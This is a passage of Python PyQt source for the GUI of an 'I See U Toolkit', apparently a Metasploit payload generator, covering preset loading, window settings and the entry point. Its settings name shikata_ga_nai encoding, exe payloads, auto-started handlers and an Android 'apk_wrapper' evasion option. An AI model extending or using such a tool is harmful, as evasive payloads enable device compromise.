                    self.default_encoder_combo.setCurrentText(self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
                    self.default_format_edit.setText(self.toolkit.config.get('default_format', 'exe'))
                    self.auto_start_handler_check.setChecked(self.toolkit.config.get('auto_start_handler', False))
                    self.auto_detect_ip_check.setChecked(self.toolkit.config.get('auto_detect_ip', True))
                    self.term_emulator_combo.setCurrentText(self.toolkit.config.get("terminal_emulator", "auto"))
                    self.term_open_check.setChecked(self.toolkit.config.get("open_terminal_for_handler", True))
                    self.term_title_edit.setText(self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
                    
                    # Update Android settings
                    android_settings = self.toolkit.config.get("android_settings", {})
                    self.android_target_sdk_combo.setCurrentText(android_settings.get("target_sdk", "android_11"))
                    self.android_evasion_combo.setCurrentText(android_settings.get("evasion_technique", "apk_wrapper"))
                    self.android_keystore_path_edit.setText(android_settings.get("keystore_path", "mykey.keystore"))
                    self.android_keystore_pass_edit.setText(android_settings.get("keystore_password", "android"))
                    self.android_key_alias_edit.setText(android_settings.get("key_alias", "mykey"))
                    self.android_key_pass_edit.setText(android_settings.get("key_password", "android"))
                    
                    QMessageBox.information(self, "Success", f"Preset '{preset_file[7:-5]}' loaded successfully")
                    self.update_status(f"Preset '{preset_file[7:-5]}' loaded successfully")
                    
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load preset: {str(e)}")
                    self.update_status(f"Error loading preset: {str(e)}")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load preset: {str(e)}")
            self.update_status(f"Error loading preset: {str(e)}")
    
    def load_window_settings(self):
        """Load window settings."""
        self.restoreGeometry(self.settings.value("geometry", b""))
        self.restoreState(self.settings.value("windowState", b""))
    
    def save_window_settings(self):
        """Save window settings."""
        self.settings.setValue("geometry", self.saveGeometry())
        self.settings.setValue("windowState", self.saveState())
    
    def closeEvent(self, event):
        """Handle window close event."""
        self.save_window_settings()
        event.accept()

def main():
    """Main entry point."""
    try:
        app = QApplication(sys.argv)
        app.setApplicationName("I See U Toolkit")
        app.setApplicationVersion("2.0")
        app.setOrganizationName("ISeeUToolkit")
        
        window = ModernISeeUGUI()
        window.show()
        
        sys.exit(app.exec())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logger.error("Unexpected error: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
